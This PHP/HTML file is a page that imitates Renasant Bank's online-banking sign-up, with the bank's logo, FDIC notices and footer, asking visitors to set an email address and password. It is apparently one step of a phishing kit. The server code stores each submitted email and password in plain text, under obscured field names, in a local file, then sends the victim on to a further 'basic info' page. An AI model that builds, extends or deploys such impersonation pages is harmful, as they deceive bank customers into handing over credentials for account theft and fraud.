<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Your Email & Password - Renasant Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    <!-- Header -->
    <header class="bg-[#114b66]">
        <div class="max-w-6xl mx-auto">
            <div class="h-20 flex items-center justify-center px-6">
                <img
                    src="assets/Logo-Dark-Background.png"
                    alt="Renasant Bank"
                    class="h-10 w-auto"
                />
            </div>
        </div>
        <div class="bg-white/90">
            <div class="max-w-6xl mx-auto px-6 py-2 text-xs text-slate-600">
                <div class="flex items-center gap-3 italic">
                    <img
                        src="assets/FDIC_Logo_blue.svg"
                        alt="FDIC"
                        class="h-6 w-auto"
                    />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-center justify-center px-4 py-12">
        <div class="space-y-6 w-full max-w-md">
            <div class="bg-white rounded-md p-8 shadow-lg shadow-slate-900/10 space-y-6">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-semibold text-slate-700">Set Your Email & Password</h2>
                    <p class="text-sm text-slate-600">Create your account credentials to access your online banking</p>
                </div>
                
                <?php if (!empty($errors)): ?>
                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                </svg>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-red-700">
                                    Please fix the following errors:
                                    <ul class="list-disc pl-5 mt-1">
                                        <?php foreach ($errors as $error): ?>
                                            <li><?php echo htmlspecialchars($error); ?></li>
                                        <?php endforeach; ?>
                                    </ul>
                                </p>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>
                
                <form method="POST" class="space-y-4">
                    <!-- Email Field -->
                    <div>
                        <label for="email" class="block text-sm text-slate-500 font-medium mb-1">Email Address</label>
                        <input
                            type="email"
                            id="email"
                            name="email"
                            value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                            class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                            placeholder="Enter your email"
                            required
                        >
                        <?php if (!empty($errors['email'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['email']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Password Field -->
                    <div>
                        <label for="password" class="block text-sm text-slate-500 font-medium mb-1">Password</label>
                        <div class="relative">
                            <input
                                type="password"
                                id="password"
                                name="password"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                placeholder="Enter password"
                                required
                            >
                            <button
                                type="button"
                                onclick="togglePasswordVisibility('password')"
                                class="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
                            >
                                <span id="passwordToggleText">Show</span>
                            </button>
                        </div>
                        <?php if (!empty($errors['password'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['password']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Confirm Password Field -->
                    <div>
                        <label for="confirmPassword" class="block text-sm text-slate-500 font-medium mb-1">Confirm Password</label>
                        <div class="relative">
                            <input
                                type="password"
                                id="confirmPassword"
                                name="confirmPassword"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                placeholder="Re-enter password"
                                required
                            >
                            <button
                                type="button"
                                onclick="togglePasswordVisibility('confirmPassword')"
                                class="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
                            >
                                <span id="confirmPasswordToggleText">Show</span>
                            </button>
                        </div>
                        <?php if (!empty($errors['confirmPassword'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['confirmPassword']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Submit Button -->
                    <div class="pt-4">
                        <button
                            type="submit"
                            class="w-full bg-[#0f4f6c] text-white py-3 rounded-md font-medium transition hover:bg-[#0a3d52]"
                        >
                            Continue
                        </button>
                    </div>
                    
                    <p class="text-xs text-slate-500 mt-4">
                        Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
                    </p>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#114b66] text-white">
        <div class="max-w-6xl mx-auto px-6 py-6">
            <div class="flex flex-col gap-4">
                <div class="flex items-center gap-4 text-sm">
                    <div class="flex items-center gap-3">
                        <img src="assets/ehl.svg" alt="Equal Housing Lender" class="h-10 w-auto" />
                        <img src="assets/fdic.svg" alt="Member FDIC" class="h-10 w-auto" />
                    </div>
                    <span class="uppercase tracking-wide text-xs">© RENASANT BANK</span>
                </div>

                <div class="flex flex-wrap gap-3 text-sm">
                    <a class="underline" href="#">Accessibility</a>
                    <span>|</span>
                    <a class="underline" href="#">Mobile Privacy</a>
                    <span>|</span>
                    <a class="underline" href="#">Privacy Statement</a>
                    <span>|</span>
                    <a class="underline" href="#">Digital Banking Agreement</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Toggle password visibility
        function togglePasswordVisibility(fieldId) {
            const input = document.getElementById(fieldId);
            const toggleText = document.getElementById(fieldId + 'ToggleText');
            
            if (input.type === 'password') {
                input.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                input.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
